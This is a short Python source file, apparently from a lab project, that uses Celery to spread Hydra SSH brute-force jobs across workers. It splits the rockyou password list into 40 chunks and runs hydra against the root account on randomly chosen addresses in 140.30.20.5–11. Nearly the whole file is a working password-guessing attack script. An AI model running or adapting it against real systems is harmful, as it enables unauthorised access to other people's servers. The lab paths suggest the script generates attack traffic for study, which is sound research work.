#
#
from __future__ import absolute_import
from .celery import app
from .tasks_hydra import task_hydra
from celery.result import ResultSet
from .end_attack.end_attack import end_attack
import time
from subprocess import call
import random


#input_file = "rockyou_160000.txt"  # Archivo de entrada
#output_prefix = 'rockyou_160000'  # Prefijo para los archivos de salida
#lines_per_file = 4000  # Número de líneas por archivo

@app.task
def start_attack():
	#split_file(input_file,output_prefix, lines_per_file)
	global r
	r = ResultSet([])
	valor=0
	while valor<40:
		fichero=f"rockyou_160000_{valor+1}.txt"
		cmd = ["hydra", "-l", "root", "-P", fichero, str(randomize_ip()), "ssh", "-t", "1"]
		r.add(task_hydra.delay(cmd))
		valor = valor +1

def randomize_ip():
	randIP = random.randrange(5,12)
	ip = "140.30.20." + str(randIP)
	print("IP: " + ip)
	return ip

def end_attacks():
	global r
	r.join()
	if r.ready() == True:
		end_attack()


"""
def split_file(input_file, output_prefix, lines_per_file):
    with open(input_file, 'r') as file:
        data = file.readlines()
    
    num_files = len(data) // lines_per_file + 1
    
    for i in range(num_files):
        start = i * lines_per_file
        end = (i + 1) * lines_per_file
        lines = data[start:end]
        
        output_file = "/home/osboxes/Documents/Dorothea/Labs/lab_attacks/attacker/"f"{output_prefix}_{i+1}.txt"
        with open(output_file, 'w') as file:
            file.writelines(lines)
"""
	    	    
if __name__ == '__main__':
	start_attack()
	end_attacks()


#############################
#head -160000 rockyou.txt > rockyou-160000.txt


